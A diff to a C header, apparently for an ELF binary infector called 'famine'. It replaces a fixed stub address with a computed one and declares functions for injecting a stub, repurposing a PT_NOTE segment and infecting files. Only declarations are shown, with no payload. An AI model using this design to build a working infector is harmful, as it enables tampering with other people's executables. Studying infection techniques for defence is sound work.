@@ -7,7 +7,7 @@
 
 # include <elf.h>
 # include <fcntl.h>
-# include <stdio.h>
+# include <stdint.h>
 # include <stdlib.h>
 # include <string.h>
 # include <sys/mman.h>
@@ -43,7 +43,6 @@
  */
 
 # define PAGE_SIZE	0x1000
-# define STUB_VADDR	0xc000000
 
 /* sentinels patched inside the stub at injection time */
 # define PLACE_ENTRY	0xAAAAAAAAAAAAAAAAULL
@@ -61,14 +60,16 @@ typedef struct s_famine
 	Elf64_Phdr *phdr; // -> prograsm header table in out
 	Elf64_Phdr *note; //PT_NOTE segment to repurpose
 	uint64_t	phdr_vaddr;
+	uint64_t	stub_vaddr; // vaddr chosen for the stub segment
 }	t_famine;
 
 // elf.c
-int	is_valid_elf(const Elf64_Ehdr *elf);
-int	find_segments(t_famine *f);
+int			is_valid_elf(const Elf64_Ehdr *elf);
+int			find_segments(t_famine *f);
+uint64_t	highest_vaddr_end(const t_famine *f);
 
-void	inject_stub(t_famine *f);
+void		inject_stub(t_famine *f);
 
-int	infect_file(const char *in_path, const char *out_path);
+int			infect_file(const char *in_path, const char *out_path);
 
 #endif
